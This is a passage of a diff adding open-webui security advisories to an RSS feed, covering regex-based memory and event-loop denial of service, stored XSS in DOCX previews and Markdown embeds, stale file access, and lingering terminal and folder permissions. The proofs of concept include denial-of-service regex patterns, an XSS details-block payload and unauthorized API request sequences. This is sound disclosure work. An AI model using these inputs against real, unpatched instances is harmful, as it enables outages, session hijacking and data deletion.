+After the fix, every indexed listing request returns HTTP 401 and the indexed chat completion returns HTTP 403, and the disabled backend records nothing. Administrator access and the routes that take no index are unchanged.&#13;
+&#13;
+## Credits&#13;
+&#13;
+Reported by @ahkarl13.</description>
+      <guid isPermaLink="false">GHSA-hm62-64q2-6gxw</guid>
+      <category>MEDIUM</category>
+      <category>open-webui/open-webui</category>
+      <pubDate>Sun, 27 Sep 2026 19:33:41 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] open-webui/open-webui — Any authenticated user can exhaust worker memory via a nested-repetition knowledge-search pattern</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-gww9-mhgj-pfqh</link>
+      <description>CVSS 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H) · CWE-400, CWE-770
+
+Affected:
+- pip/open-webui &gt;= 0.11.0, &lt; 0.11.4 (patched: 0.11.4)
+
+---
+
+# Any authenticated user can exhaust worker memory via a nested-repetition knowledge-search pattern&#13;
+&#13;
+## Summary&#13;
+The built-in knowledge search tools let a chat participant choose the pattern used to grep knowledge files. That pattern is compiled before any of the limits on the search apply, and the regular expression engine expands counted repetition as it compiles, so a pattern that nests repetition counts forces it to build a structure vastly larger than the pattern itself. A pattern of a couple of dozen characters makes one worker allocate hundreds of megabytes, and because compiled patterns are cached for the life of the process, that memory is never returned. Neither the size of that work nor the number of times it can be repeated is bounded.&#13;
+&#13;
+## Preconditions&#13;
+- Default configuration. The knowledge builtin tool group is enabled by default, and with `ENABLE_KB_EXEC` at its default of `False` the model is handed the knowledge grep tool, which is the affected path. The chat file grep tool and the `kb_exec` grep command share the same pattern compiler and are affected the same way.&#13;
+- Any authenticated user, no elevated role and no workspace permission.&#13;
+- One file the attacker can read. The tool returns early when no readable file is in scope, so a file is required, and `USER_PERMISSIONS_CHAT_FILE_UPLOAD` defaults to true so the attacker can supply their own.&#13;
+- A model willing to call the tool with the attacker's literal pattern. This is the one non-deterministic step: reliable in practice by instructing the model in your own chat, but not guaranteed on a given turn.&#13;
+- Only releases 0.11.0 through 0.11.3 carry the code. Earlier releases compiled with Python's standard library engine, which does not expand repetition this way and is unaffected. Releases 0.11.1 to 0.11.3 added a check on repetition counts, but it could be sidestepped with an escaped character or inline verbose mode, so those releases remain affected.&#13;
+- Deployments running with `UVICORN_WORKERS` at its default of 1 lose the whole instance; multi-worker deployments lose one worker per request.&#13;
+&#13;
+## Impact&#13;
+Availability, against every other user of the affected worker. Peak allocation grows with the fourth power of the repetition count while the pattern stays the same length, so the attacker chooses the cost by editing two digits, and the compiled result is then retained in the engine's pattern cache, which holds up to 500 entries before it evicts anything. Each distinct pattern is therefore a permanent bite out of the worker rather than a spike that unwinds: measured directly, one pattern at a repetition count of 40 retained about 740 MB, six distinct patterns at counts of 30 to 35 retained 1.38 GB together, and under a 2 GB memory limit the next compile failed with the process out of memory. A modest sequence of requests walks the process into memory exhaustion with no recovery short of a restart, and a deployment whose container memory limit sits below the peak loses the worker outright. While each compile runs, the work happens synchronously on the event loop, so the worker serves nobody else for its duration. There is no confidentiality or integrity effect, and no data is read or altered.&#13;
+&#13;
+## Fix&#13;
+Fixed in 0.11.4 by https://github.com/open-webui/open-webui/commit/97e013a66169c4fcd7f26ab9e41a4ff260ffd4da. Search patterns are now compiled with RE2, which refuses oversized repetition and runs under a fixed 1 MiB memory limit for the compiled pattern, and search patterns are also capped in length. Ordinary search patterns are unaffected, though regex searches now follow RE2 syntax (no lookarounds or backreferences). Upgrading is sufficient; there is nothing an operator has to configure.&#13;
+&#13;
+## Root cause&#13;
+- `backend/open_webui/tools/knowledge_fs.py`, `build_matcher`: compiled the caller's pattern with no limit on the result.&#13;
+- `backend/open_webui/tools/builtin.py`, `grep_knowledge_files`: the default-configuration caller that passes an unvalidated pattern to it; `grep_chat_files` and the `kb_exec` grep command reach the same function.&#13;
+- Affected setup: releases 0.11.0 through 0.11.3.&#13;
+&#13;
+The earlier fix for catastrophic backtracking moved matching to an engine that supports a per-search timeout and placed every search under a shared time budget. That budget is acquired after the pattern has been compiled, so by construction it governs matching only. The replacement engine materialises counted repetition at compile time, which the previous one did not, so the migration introduced a new cost on a step that had never needed a limit before and that the budget was never positioned to cover. The pattern reached the compiler with no check beyond being non-empty. The count check added in 0.11.1 scanned the raw pattern text for repetition counts, so any spelling the engine reads as a count but the scan did not recognise went through unchecked.&#13;
+&#13;
+## Proof of concept&#13;
+Against a running instance, as a user with the default `user` role and no workspace permissions:&#13;
+&#13;
+1. Upload any small text file.&#13;
+2. In a chat on a model with the knowledge tools available, have the model grep that file for `((((a{40}){40}){40}){40})|x`.&#13;
+3. The worker allocates several hundred megabytes inside the compile, and requests arriving from other connections during that window are delayed by the full duration. Repeating the request with different repetition counts adds to the total rather than reusing it.&#13;
+&#13;
+Observed on the vulnerable code, with the tool call driven by a stub upstream so the model's choice to call the tool is deterministic. Everything from the tool call onward is unmodified Open WebUI code. Worker memory growth and the delay seen by a concurrent request on a second connection:&#13;
+&#13;
+| repetition count | worker memory | concurrent request delayed by |&#13;
+| ---------------- | ------------- | ----------------------------- |&#13;
+| literal pattern  | 0.1 MB        | 20 ms                         |&#13;
+| 32               | 273 MB        | 219 ms                        |&#13;
+| 40               | 612 MB        | 513 ms                        |&#13;
+&#13;
+The pattern is 27 bytes at every row, so limiting the length of the input does not bound the cost. The engine used before 0.11.0 compiles all of these in under a millisecond with no measurable allocation, and 0.11.4 rejects them outright.&#13;
+&#13;
+## Credits&#13;
+@baeseungwon1010, for identifying that compilation runs outside the matching budget.</description>
+      <guid isPermaLink="false">GHSA-gww9-mhgj-pfqh</guid>
+      <category>MEDIUM</category>
+      <category>open-webui/open-webui</category>
+      <pubDate>Sun, 27 Sep 2026 19:32:16 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] open-webui/open-webui — Any authenticated user can repeatedly stall a worker via file-search regex on the event loop</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-gfjp-5hc9-852r</link>
+      <description>CVSS 4.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L) · CWE-1333
+
+Affected:
+- pip/open-webui &gt;= 0.11.0, &lt; 0.11.4 (patched: 0.11.4)
+
+---
+
+# Any authenticated user can repeatedly stall a worker via file-search regex on the event loop&#13;
+&#13;
+## Summary&#13;
+The built-in file search tools let a chat participant choose the pattern used to grep files. Since 0.11.0 each search has been capped at 2 seconds of matching time, but the matching itself still ran directly on the server's event loop. A crafted pattern that backtracks until the cap is hit therefore froze the whole worker for about 2 seconds on every call, and nothing stopped the calls from being repeated.&#13;
+&#13;
+## Preconditions&#13;
+- Default configuration. The knowledge builtin tool group is enabled by default, and with `ENABLE_KB_EXEC` at its default of `False` the model is offered `grep_knowledge_files`, which accepts a file id.&#13;
+- Any authenticated user, no elevated role and no workspace permission.&#13;
+- One file the attacker can read. `USER_PERMISSIONS_CHAT_FILE_UPLOAD` defaults to true and a user can always read their own upload.&#13;
+- A model willing to call the tool with the attacker's literal pattern. This is reliable in practice by instructing the model in your own chat, but not guaranteed on a given turn.&#13;
+- The chat file tool `grep_chat_files` is affected the same way, but it is only offered when a model's File Context capability has been turned off.&#13;
+- Deployments running with `UVICORN_WORKERS` at its default of 1 stall the whole instance; multi-worker deployments stall one worker per call.&#13;
+&#13;
+## Impact&#13;
+Availability, against every other user of the affected worker. Each call held the event loop for the full 2 second budget, during which the worker handled no other request, and every further call from the same or another chat held it again. The same file searched with a literal pattern finished in a few milliseconds. There is no confidentiality or integrity effect, and no data is read or altered.&#13;
+&#13;
+## Fix&#13;
+Fixed in 0.11.4. https://github.com/open-webui/open-webui/pull/29621 moved the built-in chat and knowledge file searches off the event loop into a worker thread, the knowledge filesystem search was moved off the event loop the same way, and pattern matching switched to the RE2 engine, which runs in linear time and cannot backtrack catastrophically. Upgrading is sufficient; there is nothing an operator has to configure.&#13;
+&#13;
+## Root cause&#13;
+- `backend/open_webui/tools/builtin.py`, `grep_knowledge_files` and `grep_chat_files`: called the synchronous file search directly from the async tool.&#13;
+- `backend/open_webui/tools/knowledge_fs.py`, `build_matcher`: compiled the caller's pattern with a backtracking engine under a 2 second timeout.&#13;
+- Affected builds: 0.11.0 through 0.11.3. Earlier versions had no time limit at all and are covered by GHSA-2f54-p244-32q6.&#13;
+&#13;
+The fix for GHSA-2f54-p244-32q6 bounded how long one search could run, but a time limit on a synchronous call does not give the event loop back while the call is running. The search still executed on the loop thread, so for the whole budget the worker could not serve anyone else, and the budget reset on every tool call.&#13;
+&#13;
+## Proof of concept&#13;
+Against the tool code of 0.11.3 as an ordinary user:&#13;
+&#13;
+1. Upload a text file whose content is a single line of 28 `a` characters followed by `!`.&#13;
+2. In a chat, instruct the model to call `grep_knowledge_files` with the pattern `(a|a)+$` and that file's id.&#13;
+3. The tool returns `Search exceeded 2s, narrow the pattern` after about 2 seconds. A task scheduled every 50 ms on the same event loop does not run for 2.06 seconds while the search is in progress. Repeating the call repeats the stall.&#13;
+&#13;
+Measured by running the real tool functions of each release with a concurrent 50 ms event-loop heartbeat (file lookup seeded directly with the file above):&#13;
+&#13;
+| version | tool | call time | longest heartbeat gap |&#13;
+| ------- | ---- | --------- | --------------------- |&#13;
+| 0.11.3 | grep_knowledge_files | 2.007s | 2.057s |&#13;
+| 0.11.3 | grep_chat_files | 2.009s | 2.059s |&#13;
+| 0.11.4 | grep_knowledge_files | 0.004s | 0.051s |&#13;
+| 0.11.4 | grep_chat_files | 0.005s | 0.051s |&#13;
+&#13;
+## Credits&#13;
+@yousif-IQ, for the finding.&#13;
+@tahahassan773, analysis.</description>
+      <guid isPermaLink="false">GHSA-gfjp-5hc9-852r</guid>
+      <category>MEDIUM</category>
+      <category>open-webui/open-webui</category>
+      <pubDate>Sun, 27 Sep 2026 19:30:44 +0000</pubDate>
+    </item>
+    <item>
+      <title>[HIGH] open-webui/open-webui — Any authenticated user can steal another user's session token via script embedded in a DOCX preview</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-f9xp-mfmq-x6cg</link>
+      <description>CVSS 8.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N) · CWE-79, CWE-1021
+
+Affected:
+- pip/open-webui &gt;= 0.11.1, &lt;= 0.11.3 (patched: 0.11.4)
+
+---
+
+# Any authenticated user can steal another user's session token via script embedded in a DOCX preview&#13;
+&#13;
+## Summary&#13;
+Any authenticated user who can upload a DOCX attachment can embed active content in it that runs in the browser of anyone who previews the file, in the Open WebUI page origin. The preview renders a document-supplied HTML part and keeps document-supplied link targets without restriction, so embedded script reads the viewer's session token from local storage. When the viewer is an administrator, replaying that token grants full administrative control of the instance with no password.&#13;
+&#13;
+## Preconditions&#13;
+- An approved account (role `user` or higher) able to upload DOCX attachments. New sign-ups start as `pending` by default (`DEFAULT_USER_ROLE=pending`) and cannot upload until an administrator approves them.&#13;
+- The victim must open the shared chat, open the attachment and switch to the Preview view (one user interaction).&#13;
+- No non-default configuration is required. The behaviour is present out of the box on affected versions.&#13;
+&#13;
+## Impact&#13;
+The embedded script executes in the Open WebUI origin in the viewer's authenticated session and can read the session token. A stolen administrator token replays directly against the API without a password, giving the attacker the full administrator capability set (enumerating all users, changing roles, reading all chats and documents, creating API keys, changing instance settings). A low-privileged attacker thereby escalates to full instance control through one previewed document. Instances where DOCX preview is never used by higher-privileged users are not affected in practice.&#13;
+&#13;
+## Fix&#13;
+Fixed in v0.11.4 by #29699. The DOCX preview no longer renders embedded HTML parts (the renderer is told not to inline document-supplied HTML sub-documents), and after rendering any link target that does not resolve to http, https, mailto or tel is removed. Upgrading to v0.11.4 or later fully resolves the issue with no further configuration.&#13;
+&#13;
+## Root cause&#13;
+The affected component is the DOCX preview (`src/lib/components/common/DocxPreview.svelte`), present from v0.11.1 onward. It rendered uploaded documents through the preview renderer on its main path with the renderer's default behaviour, which inlines a document-supplied HTML part into a same-origin frame and preserves document-supplied link targets verbatim. Sanitization existed only on a fallback branch that the normal render path did not reach, so a crafted document embedding an HTML part, or a link with a script scheme, executed in the page origin when previewed.&#13;
+&#13;
+## Proof of concept&#13;
+A crafted `.docx` containing a body-level OOXML altChunk pointing to an internal HTML part, and a hyperlink with a script scheme, was rendered with the affected version's option set and the fixed version's option set using the shipped renderer. Under the affected options the HTML part was inlined into a same-origin frame and the script-scheme link target was preserved and executed. Under the fixed options the embedded part was skipped and the unsafe link target was removed, so neither path executed.&#13;
+&#13;
+## Credits&#13;
+@Observerkay: reported the stored XSS in the DOCX preview via the OOXML altChunk mechanism, with an end-to-end token-theft to administrator-takeover proof of concept.</description>
+      <guid isPermaLink="false">GHSA-f9xp-mfmq-x6cg</guid>
+      <category>HIGH</category>
+      <category>open-webui/open-webui</category>
+      <pubDate>Sun, 27 Sep 2026 19:29:00 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] open-webui/open-webui — Stored XSS via user-authored tool-call embeds in the Markdown renderer</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-9wj4-mcm3-ppj6</link>
+      <description>CVSS 4.6 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N) · CWE-79
+
+Affected:
+- pip/open-webui &gt;= 0.6.31, &lt; 0.11.4 (patched: 0.11.4)
+
+---
+
+# Stored XSS via user-authored tool-call embeds in the Markdown renderer&#13;
+&#13;
+## Summary&#13;
+Any authenticated user can execute arbitrary JavaScript in other users' browsers by sending content shaped as a tool-call `&lt;details&gt;` block. The Markdown renderer parsed the block's `embeds` attribute without distinguishing server-generated tool-call output from user-authored input, decoded and JSON-parsed it, and mounted each element in a sandboxed iframe with scripts enabled, so it ran at render time for every viewer. The missing control is a trust gate separating user content from the tool-call embed path.&#13;
+&#13;
+## Preconditions&#13;
+An authenticated account on the instance. The primary demonstrated surface is channel messages, which requires the Channels feature enabled by an admin (`ENABLE_CHANNELS`, off by default); the same gadget also reaches main-chat user messages and citation previews of retrieved documents, which need no special feature flag. No elevated role is required. By default the embed iframe is sandboxed `allow-scripts` without `allow-same-origin`, so the injected script runs in an opaque origin.&#13;
+&#13;
+## Impact&#13;
+The injected script executes in a null-origin sandboxed iframe for anyone who views the message or opens the citation. In the default configuration it cannot read the viewer's session token or make same-origin authenticated requests; the confirmed default primitive is contained script execution and convincing in-app phishing content rendered inside the interface. Where an operator has turned on `iframeSandboxAllowSameOrigin`, the sandbox gains `allow-same-origin` and the script can read `localStorage` (session token) and act as the victim, raising the impact to session hijacking. The payload is stored, so it re-executes on every view.&#13;
+&#13;
+## Fix&#13;
+Fixed in 0.11.4 by PR #29985. Embed rendering is now opt-in: the flag defaults off and is forwarded through every Markdown render path, including the standalone tool-call branch, colon fences and alerts. Assistant responses opt in only for the viewer's own chat; channel messages and read-only/shared views pass it explicitly off, so user-authored content can no longer reach the embed iframe. Upgrading to 0.11.4 fully resolves the issue with no additional configuration.&#13;
+&#13;
+## Root cause&#13;
+The tool-call embed sink lives in the shared Markdown renderer: `ToolCallDisplay.svelte` and `ConsecutiveDetailsGroup.svelte` read the `embeds` attribute off a `&lt;details type="tool_calls"&gt;` token and mount each element in `FullHeightIframe` with `allowScripts={true}`. The renderer never distinguished tokens produced by the tool-execution pipeline from tokens parsed out of arbitrary user-authored message content, and the later `allowEmbeds` guard was applied only to the grouped path, so a single standalone details block bypassed it entirely and reached the iframe on every surface that renders user content.&#13;
+&#13;
+## Proof of concept&#13;
+Reproduced on stock 0.11.3 with default settings and Channels enabled. A non-admin account posted a channel message whose content was `&lt;details type="tool_calls" embeds="[&amp;quot;&amp;lt;script&amp;gt;...&amp;lt;/script&amp;gt;&amp;quot;]"&gt;...&lt;/details&gt;`. Opening the channel rendered one iframe with `sandbox="allow-scripts allow-popups allow-downloads"` and the attacker HTML in `srcdoc`, and the injected script executed in the viewer's browser (null origin). The same message on 0.11.4 renders no iframe and no script runs.&#13;
+&#13;
+## Credits&#13;
+@KadirArslan: channel messages, original report and proof of concept.&#13;
+@5yu4n: cross-user delivery through channel direct messages.&#13;
+@ComputerOnFire: citation previews of knowledge-base documents, and the ungated standalone-block path.</description>
+      <guid isPermaLink="false">GHSA-9wj4-mcm3-ppj6</guid>
+      <category>MEDIUM</category>
+      <category>open-webui/open-webui</category>
+      <pubDate>Sun, 27 Sep 2026 19:27:08 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] open-webui/open-webui — Knowledge base collaborators keep read and delete access to removed files via stale file metadata</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-9cxp-636w-4997</link>
+      <description>CVSS 5.0 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L) · CWE-863
+
+Affected:
+- pip/open-webui &gt;= 0.6.0, &lt; 0.11.4 (patched: 0.11.4)
+
+---
+
+# Knowledge base collaborators keep read and delete access to removed files via stale file metadata&#13;
+&#13;
+## Summary&#13;
+A user who has been granted access to a shared knowledge base keeps access to a file after the owner removes that file from the knowledge base. With a read grant they can still download the file, and with a write grant they can delete it for everyone, including from other private knowledge bases of the owner that they cannot open. The file access check trusted a knowledge base reference cached on the file record and never confirmed that the file is still attached to that knowledge base.&#13;
+&#13;
+## Preconditions&#13;
+- Default configuration. No setting needs to be changed.&#13;
+- The attacker is an ordinary user who holds a read grant (to read) or a write grant (to delete) on a knowledge base owned by the victim.&#13;
+- The file was last processed into that shared knowledge base. If it was processed into another knowledge base afterwards, the cached reference points elsewhere and the issue does not occur.&#13;
+- The owner removes the file from the shared knowledge base in a way that keeps the file on the instance: the knowledge base sync cleanup when the file is still attached to another knowledge base, or, up to 0.11.0, resetting the knowledge base.&#13;
+- The attacker knows the file id, which they could see while the file was still shared with them.&#13;
+&#13;
+## Impact&#13;
+After the file has been removed from the shared knowledge base, the former collaborator can still download its content and, with a write grant, delete it. Deletion removes the file from every knowledge base that still references it, including the owner's private ones that the attacker never had access to. Exploitation depends on the owner's own actions (processing order and how the file was removed), so an attacker cannot force it. Files that were never shared through a knowledge base, and knowledge bases the attacker was never granted, are not affected.&#13;
+&#13;
+## Fix&#13;
+Fixed in PR #29937. Knowledge base access to a file is now derived only from the file's current knowledge base associations, and the cached reference on the file record is no longer consulted. Upgrading is sufficient.&#13;
+&#13;
+## Root cause&#13;
+- Component: `has_access_to_file` in `backend/open_webui/utils/access_control/files.py` (in `backend/open_webui/routers/files.py` before 0.8.6), used by the file content, update, rename and delete endpoints.&#13;
+- Affected setup: every build from 0.6.0 to 0.11.3.&#13;
+&#13;
+When a file is processed into a knowledge base, the id of that knowledge base is stored in the file's metadata. The access check granted access to anyone with the matching permission on the knowledge base named there, but it never checked that the file was still attached to it. Removing a file from a knowledge base does not clear that value, so the old knowledge base's grants kept applying to the file after it had been removed.&#13;
+&#13;
+## Proof of concept&#13;
+1. As the owner, create private knowledge bases B and A and upload a text file containing a unique marker.&#13;
+2. Add the file to B and let it process, then add it to A and let it process.&#13;
+3. Grant the attacker read and write on A with `POST /api/v1/knowledge/{A}/access/update`.&#13;
+4. As the owner, remove the file from A with `POST /api/v1/knowledge/{A}/sync/cleanup` and `{"file_ids":["FILE_ID"],"dir_ids":[]}`. The file remains in B, and the attacker cannot open B.&#13;
+5. As the attacker, `GET /api/v1/files/FILE_ID/content` returns 200 with the marker.&#13;
+6. As the attacker, `DELETE /api/v1/files/FILE_ID` returns 200, and the file is removed from B.&#13;
+7. Control: with processing order A then B, both requests return 404.&#13;
+&#13;
+The reporter reproduced this over HTTP on a running instance. It was independently reproduced on 0.11.3 (sync cleanup) and on 0.6.0 and 0.11.0 (knowledge base reset) against the real routers, with the users, knowledge bases, grants and the cached processing reference seeded directly into the database. On 0.11.4 both requests return 404.&#13;
+&#13;
+## Credits&#13;
+@torjan0 reported the issue and the proof of concept.</description>
+      <guid isPermaLink="false">GHSA-9cxp-636w-4997</guid>
+      <category>MEDIUM</category>
+      <category>open-webui/open-webui</category>
+      <pubDate>Sun, 27 Sep 2026 19:25:50 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] open-webui/open-webui — Deactivated users keep terminal command execution via an already open terminal WebSocket</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-6g45-8g27-fh8q</link>
+      <description>CVSS 6.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L) · CWE-613
+
+Affected:
+- pip/open-webui &gt;= 0.8.8, &lt; 0.11.4 (patched: 0.11.4)
+
+---
+
+# Deactivated users keep terminal command execution via an already open terminal WebSocket&#13;
+&#13;
+## Summary&#13;
+When an administrator deactivates a user by setting their role to pending, Open WebUI refuses that user's later HTTP requests and new WebSocket handshakes. A terminal WebSocket the user had already opened stayed connected and kept forwarding their commands to the terminal server. Nothing re-checked the user's access once the connection was established, so deactivation did not cut off an open terminal.&#13;
+&#13;
+## Preconditions&#13;
+- An administrator has configured at least one terminal server connection (none exist by default) and granted the user access to it.&#13;
+- The user has a terminal session open in the Open WebUI interface at the moment they are deactivated.&#13;
+- No other knowledge is needed. The user only keeps the already open terminal tab.&#13;
+&#13;
+Deployments without a configured terminal server are not affected.&#13;
+&#13;
+## Impact&#13;
+A deactivated user who kept a terminal open can keep running commands on the terminal server as before, including reading and writing files there, until the connection closes for some other reason. The access is the same the user held before deactivation, so exploitation needs no skill, only an open tab at the right moment. Deactivation therefore does not give an administrator an immediate way to cut off a terminal user. Accounts that never had terminal access gain nothing.&#13;
+&#13;
+## Fix&#13;
+Fixed in commit e8bd0661d. Every open terminal session now re-checks the user's access every ten seconds: the token is still valid, the user still exists and holds an approved role, the terminal server is still configured and enabled, and the user still has access to it. The session is closed when any check fails. After upgrading, a revoked user loses an open terminal within about ten seconds.&#13;
+&#13;
+## Root cause&#13;
+- Component: the terminal proxy WebSocket route (`/api/v1/terminals/{server_id}/api/terminals/{session_id}`) in `backend/open_webui/routers/terminals.py`.&#13;
+- Affected setup: every release from 0.8.8 (where the terminal WebSocket proxy was introduced) up to and including 0.11.3.&#13;
+&#13;
+The proxy authenticated the user and checked their access to the terminal server only once, on the first message of the connection, and then relayed every later frame in both directions. The role change handling that disconnects a user's live Socket.IO sessions does not reach this raw WebSocket, and no periodic check existed. So a connection opened while the user was allowed stayed usable after that permission was withdrawn.&#13;
+&#13;
+## Proof of concept&#13;
+Reproduced by the reporter on Open WebUI 0.11.3 with the official Open Terminal container:&#13;
+1. Give an ordinary user access to a configured terminal server.&#13;
+2. Sign in as that user, open the terminal in the Open WebUI interface and run a command, for example `whoami; hostname; date -u`.&#13;
+3. As an administrator, change the user's role to `pending`.&#13;
+4. Without reloading the page or reconnecting, send `date -u; echo post_deactivation_write &gt; /tmp/owui-proof; cat /tmp/owui-proof` through the same terminal. It runs and prints `post_deactivation_write` after the recorded role change.&#13;
+5. Reload the browser. Open WebUI now shows "Account Activation Pending" for the same account.&#13;
+&#13;
+Independently confirmed on real 0.11.3 and 0.11.4 backends, with a stand-in echo server in place of the terminal server. On 0.11.3, commands sent 1 and 12 seconds after the role change both reached the terminal server. On 0.11.4, the proxy closed the connection within the ten-second check interval and later commands were no longer forwarded.&#13;
+&#13;
+## Credits&#13;
+@zyakir13 reported the issue with a live demonstration against a running instance.</description>
+      <guid isPermaLink="false">GHSA-6g45-8g27-fh8q</guid>
+      <category>MEDIUM</category>
+      <category>open-webui/open-webui</category>
+      <pubDate>Sun, 27 Sep 2026 19:22:59 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] open-webui/open-webui — Read-only shared folder members can still add chats to the folder by forking</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-6fjc-5cg3-mgvh</link>
+      <description>CVSS 4.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N) · CWE-862
+
+Affected:
+- pip/open-webui &gt;= 0.11.0, &lt; 0.11.4 (patched: 0.11.4)
+
+---
+
+# Read-only shared folder members can still add chats to the folder by forking&#13;
+&#13;
+## Summary&#13;
+A member of a shared folder who once had write access and was later downgraded to read-only could keep adding new chats to that folder. Forking a chat they had created in the folder while they could still write produced a new chat inside the same folder, without checking whether they could still write there. The new chat then appears to everyone who can read the folder. Direct chat creation, chat moves and chat completions already enforced folder write access; the fork action did not.&#13;
+&#13;
+## Preconditions&#13;
+- An authenticated account of any role that was given write access to a shared folder and later downgraded to read-only by the folder owner.&#13;
+- The member created at least one chat in that folder while they still had write access.&#13;
+- Folders enabled, which is the default (`ENABLE_FOLDERS=true`, `USER_PERMISSIONS_FEATURES_FOLDERS=true`), and the chat import permission, which forking requires and which ordinary users hold by default (`USER_PERMISSIONS_CHAT_IMPORT=true`).&#13;
+- Folders that were never shared with write access, and members who never had write access, are not affected.&#13;
+&#13;
+## Impact&#13;
+The integrity of shared folder contents. Revoking a member's write access did not stop them from adding entries: using the chat they created earlier, they could fork it any number of times, and each fork shows up in the shared folder for the owner and every other member, under a title and with content the attacker controls. The owner has no signal that the downgrade was ineffective.&#13;
+&#13;
+Nothing is disclosed to the attacker and nothing belonging to other users is changed or deleted. Availability is unaffected.&#13;
+&#13;
+## Fix&#13;
+Fixed in 0.11.4 by https://github.com/open-webui/open-webui/pull/30069. A fork now keeps the source chat's folder only when the caller still has write access to it and is otherwise created outside any folder, matching chat creation and chat moves. Upgrading to 0.11.4 resolves it completely, with no configuration change required.&#13;
+&#13;
+## Root cause&#13;
+Affected component: the chat fork handler in `backend/open_webui/routers/chats.py`, reached through `POST /api/v1/chats/{id}/fork`. Affected setup: every deployment on 0.11.0 through 0.11.3 with folders enabled.&#13;
+&#13;
+The fork action was added in 0.11.0 and built the new chat by copying the folder of the source chat. Because the source chat belongs to the caller, the handler treated its folder as already authorized, but write access to a shared folder can be revoked after the chat was placed there. When the folder write check was consolidated into one shared helper for the other chat creation paths in 0.11.1, the fork path was not routed through it.&#13;
+&#13;
+## Proof of concept&#13;
+Reproduced on running 0.11.3 and 0.11.4 instances with two accounts: an administrator acting as folder owner and an ordinary user acting as attacker.&#13;
+&#13;
+1. The owner creates a folder and grants the attacker write access through `POST /api/v1/folders/{id}/access/update`.&#13;
+2. The attacker creates a chat in that folder with `POST /api/v1/chats/new`.&#13;
+3. The owner downgrades the attacker to read access. A direct `POST /api/v1/chats/new` into the folder is now rejected.&#13;
+4. The attacker calls `POST /api/v1/chats/{chat_id}/fork` on the chat from step 2.&#13;
+5. On 0.11.3 the fork is created with the shared folder's id and is listed by `GET /api/v1/folders/{id}/shared/chats` for both the attacker (`folder_permission: read`) and the owner. On 0.11.4 the fork is created outside any folder and does not appear in the listing.&#13;
+&#13;
+## Credits&#13;
+- @avrlab233 (reporter)</description>
+      <guid isPermaLink="false">GHSA-6fjc-5cg3-mgvh</guid>
+      <category>MEDIUM</category>
+      <category>open-webui/open-webui</category>
+      <pubDate>Sun, 27 Sep 2026 16:42:03 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] open-webui/open-webui — Instance-wide stall via recurrence rules with no possible occurrence</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-5w58-mwmh-vf2m</link>
+      <description>CVSS 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H) · CWE-400, CWE-834
+
+Affected:
+- pip/open-webui &gt;= 0.9.0, &lt; 0.11.4 (patched: 0.11.4)
+
+---
+
+# Instance-wide stall via recurrence rules with no possible occurrence&#13;
+&#13;
+## Summary&#13;
+A recurrence rule whose date filters can never be satisfied, for example February 30th, has no occurrence at any point in time. Computing its next run walked the whole search horizon of the calendar library before reporting that there is none, synchronously on the shared event loop. One automation create or update request from one account therefore held up the entire deployment for seconds, and the request could be repeated indefinitely. Nothing bounded that search by time, by iteration count or by how far ahead it looked.&#13;
+&#13;
+## Preconditions&#13;
+An account permitted to create or update automations. `USER_PERMISSIONS_FEATURES_AUTOMATIONS` defaults to `False`, so out of the box only an administrator can reach it. It becomes reachable by ordinary users on any deployment that has granted the automations feature, which is the normal way to make the shipped feature usable. No other configuration matters, and no knowledge of other users, ids or tokens is required. `UVICORN_WORKERS` defaults to 1, so a single blocked event loop is the whole instance.&#13;
+&#13;
+## Impact&#13;
+Availability, against every other user of the instance. The stall lasts as long as the search, and the attacker picks the duration through the rule's shape: a minutely rule on February 30th costs about 4 seconds, and adding a full `BYSECOND` list raises the same single request to over 30 seconds. The rule is rejected once the search finishes, so nothing is stored and nothing shows up in the automation list, but the cost has already been paid. The per-user automation limits are checked after validation, so they do not reduce it. Requests are cheap and can be repeated or pipelined, so one account in a loop keeps the instance unresponsive for as long as it continues. There is no confidentiality or integrity impact, and no data is written.&#13;
+&#13;
+## Fix&#13;
+Fixed in commit 5fb869db221d9599a576e8e2eea9c3314947d25e. All recurrence evaluation now runs in a separate worker process with a two-second limit, so the event loop stays free while a rule is evaluated. A rule that cannot be settled within that limit is rejected on write, and the scheduler skips it. Upgrading fully resolves the issue; no configuration change is required.&#13;
+&#13;
+## Root cause&#13;
+Affected component: the recurrence-rule validator (`validate_rrule` and `_parse_rule` in `backend/open_webui/utils/automations.py`), reached from `POST /api/v1/automations/create` and `POST /api/v1/automations/{id}/update` in `backend/open_webui/routers/automations.py`.&#13;
+Affected setup: every build that ships automations, from 0.9.0 up to the fix.&#13;
+&#13;
+The validator checked that a rule has a future occurrence by asking the calendar library for the next one and treating an empty answer as invalid. For a rule that can never match, the library can only give that empty answer after exhausting its entire search space, and the validator put no limit on that search. Both routes are async handlers and called the validator directly, so the search ran on the event loop and blocked every other request for its full duration. The earlier fix for sub-daily rules anchored in the year 2000 did not help here: that fix moves the starting point of the search, and a rule with no occurrence is walked to the end of the representable range wherever the search starts.&#13;
+&#13;
